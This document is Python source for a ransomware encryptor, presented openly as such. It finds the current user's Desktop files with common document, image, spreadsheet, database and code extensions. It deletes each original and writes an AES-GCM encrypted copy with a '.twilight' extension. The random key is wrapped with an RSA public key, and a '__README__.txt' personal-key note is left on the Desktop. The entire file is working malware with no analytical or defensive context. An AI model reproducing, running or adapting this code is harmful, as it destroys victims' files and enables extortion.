##### ENCRYPT FILES AND GENERATE PERSONAL KEY WITH RSA PUBLIC KEY #####

import os
import glob
import random
import string
import base64
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Protocol.KDF import scrypt
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor

KEY = b"""-----BEGIN PUBLIC KEY-----
PUBLIC KEY
-----END PUBLIC KEY-----"""

def rsa(data):
    key = RSA.import_key(KEY)
    cipher = PKCS1_OAEP.new(key)
    encrypted = cipher.encrypt(data)
    return encrypted

def genKey(password, salt=None):
    if salt is None:
        salt = get_random_bytes(16)
    key = scrypt(password.encode(), salt, key_len=32, N=2**14, r=8, p=1)
    return key, salt

def encrypt(key, plaintext):
    nonce = get_random_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return nonce + ciphertext + tag

def encryptFile(key, target):
    with open(target, "rb") as f:
        plaintext = f.read()
    os.remove(target)
    key, salt = genKey(key)
    encrypted = encrypt(key, plaintext)
    with open(target+".twilight", "wb") as f:
        f.write(salt + encrypted)

username = os.environ["USERNAME"]
target = f"C:\\Users\\{username}\\Desktop\\*"
extension = ["txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "jpg", "png", "csv", "sql", "mdb", "sln", "php", "asp", "aspx", "html", "xml", "psd"]
key = "".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(32))

for i in glob.glob(target):
    if not os.path.isdir(i):
        for j in extension:
            if i.split(".")[-1] == j:
                with ThreadPoolExecutor(max_workers=10) as executor:
                    executor.submit(encryptFile, key, i)

PERSONALKEY = base64.b64encode(rsa(key.encode())).decode()
del key

note = "THIS IS YOUR PERSONAL KEY\nPERSONALKEY".replace("PERSONALKEY", PERSONALKEY)
with open(f"C:\\Users\\{username}\\Desktop\\__README__.txt", "w", encoding="utf-8") as f:
    f.write(note)
